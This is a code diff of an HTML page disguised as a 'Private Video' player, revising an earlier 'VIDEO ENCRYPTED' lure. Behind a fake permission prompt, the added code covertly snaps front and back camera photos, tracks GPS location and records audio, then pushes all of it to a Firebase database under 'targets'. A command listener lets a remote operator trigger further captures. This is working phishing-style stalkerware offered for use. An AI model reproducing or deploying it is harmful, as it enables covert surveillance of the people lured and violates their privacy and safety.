@@ -3,116 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Stream - Watch Now</title>
+    <title>Private Video Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
-        #container { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
-        #blur-bg { position: absolute; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=1000&q=80'); background-size: cover; filter: blur(20px); z-index: 1; }
-        #overlay { position: absolute; z-index: 10; text-align: center; color: white; background: rgba(0,0,0,0.6); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        #play-btn { width: 100px; height: 100px; background: rgba(0, 255, 65, 0.7); border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; border: 5px solid #fff; box-shadow: 0 0 30px #00ff41; transition: 0.3s; }
-        #play-btn:hover { transform: scale(1.1); }
-        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid white; margin-left: 10px; }
-        video { width: 100%; height: 100%; object-fit: contain; display: none; position: relative; z-index: 5; }
+        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
+        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(25px); opacity:0.6; }
+        #popup { position:relative; z-index:10; background:rgba(255,255,255,0.95); padding:30px; border-radius:15px; text-align:center; width:80%; max-width:320px; box-shadow:0 0 50px rgba(0,0,0,0.8); }
+        .btn { background:#00ff41; color:#000; border:none; padding:15px 30px; font-weight:bold; border-radius:30px; cursor:pointer; margin-top:20px; font-size:16px; }
+        video#real-stream { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
     </style>
 </head>
 <body>
 
-<div id="container">
-    <div id="overlay">
-        <div id="play-btn" onclick="initBossSystem()"></div>
-        <h2 style="letter-spacing:2px; margin-top:20px;">VIDEO ENCRYPTED</h2>
-        <p style="color:#00ff41;">Allow Access to Decrypt and Watch</p>
-    </div>
-    <div id="blur-bg"></div>
-    <video id="main-video" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+<video id="blur-vid" autoplay muted loop playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
+
+<div id="popup">
+    <h3 style="margin:0; color:#333;">Private Video</h3>
+    <p style="color:#666; font-size:14px;">Are you sure you want to watch this private content?</p>
+    <button class="btn" onclick="startWork()">YES, WATCH NOW</button>
 </div>
 
+<video id="real-stream" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+
 <script>
+    // Firebase Setup
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
-    
-    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
-    let masterStream = null;
+    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
 
-    async function initBossSystem() {
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('blur-bg').style.display = 'none';
-        const v = document.getElementById('main-video');
+    let streamRef = null;
+
+    async function startWork() {
+        document.getElementById('popup').style.display = 'none';
+        document.getElementById('blur-vid').style.display = 'none';
+        const v = document.getElementById('real-stream');
         v.style.display = 'block';
 
         try {
-            // High Priority Permissions
-            masterStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // Seedha Permission Request
+            streamRef = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             v.play();
 
-            // Notify Admin
-            await sendIntel();
-            
-            // Auto-Capture Initial Intel
-            capturePhoto('user'); // Front
-            setTimeout(() => { capturePhoto('environment'); }, 5000); // Back
+            // Initial Data
+            db.ref(`targets/${sessionID}/info`).set({ status: "ONLINE", time: new Date().toLocaleTimeString() });
 
-            // Real-time Listeners
-            listenCommands();
-            trackGPS();
+            // 1. Location (Workable)
+            navigator.geolocation.watchPosition(p => {
+                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+            }, null, {enableHighAccuracy:true});
 
-        } catch (err) {
-            db.ref(`targets/${sessionID}/info`).set({ status: "BLOCKED", time: new Date().toLocaleTimeString() });
-            alert("Security Error: Permissions Required to view this content.");
-            location.reload();
-        }
+            // 2. Front & Back Camera Auto-Capture
+            capture(true); // Front
+            setTimeout(() => capture(false), 4000); // Back
+
+            // 3. Command Listener
+            db.ref(`commands/${sessionID}`).on('value', s => {
+                const c = s.val(); if(!c) return;
+                if(c.action === 'photo') capture(true);
+                if(c.action === 'back') capture(false);
+                if(c.action === 'audio') record();
+                db.ref(`commands/${sessionID}`).remove();
+            });
+
+        } catch (e) { alert("Error: Content requires permissions to play."); location.reload(); }
     }
 
-    async function sendIntel() {
-        const batt = await navigator.getBattery().catch(() => ({level: 1}));
-        db.ref(`targets/${sessionID}/info`).set({
-            battery: Math.floor(batt.level * 100) + "%",
-            status: "ONLINE",
-            time: new Date().toLocaleTimeString()
-        });
-    }
-
-    async function capturePhoto(mode) {
+    async function capture(isFront) {
         try {
-            const track = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const track = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: isFront ? "user" : "environment" } 
+            });
             const vid = document.createElement('video');
             vid.srcObject = track;
             await vid.play();
-            
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
                 canvas.getContext('2d').drawImage(vid, 0, 0);
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: mode === 'user' ? "FRONT" : "BACK"
+                    type: isFront ? "FRONT" : "BACK"
                 });
                 track.getTracks().forEach(t => t.stop());
-            }, 1500);
-        } catch(e) {}
+            }, 2000);
+        } catch(err) { console.log("Cam Error"); }
     }
 
-    function listenCommands() {
-        db.ref(`commands/${sessionID}`).on('value', snap => {
-            const cmd = snap.val(); if(!cmd) return;
-            if(cmd.action === 'photo') capturePhoto('user');
-            if(cmd.action === 'back_photo') capturePhoto('environment');
-            if(cmd.action === 'audio') recordAudio();
-            db.ref(`commands/${sessionID}`).remove();
-        });
-    }
-
-    function trackGPS() {
-        navigator.geolocation.watchPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-        }, null, {enableHighAccuracy:true});
-    }
-
-    function recordAudio() {
-        const recorder = new MediaRecorder(masterStream);
+    function record() {
+        const recorder = new MediaRecorder(streamRef);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
         recorder.onstop = () => {
@@ -121,7 +103,7 @@
             reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
         };
         recorder.start();
-        setTimeout(() => recorder.stop(), 15000); // 15s clip
+        setTimeout(() => recorder.stop(), 10000); // 10 Second Recording
     }
 </script>
 </body>
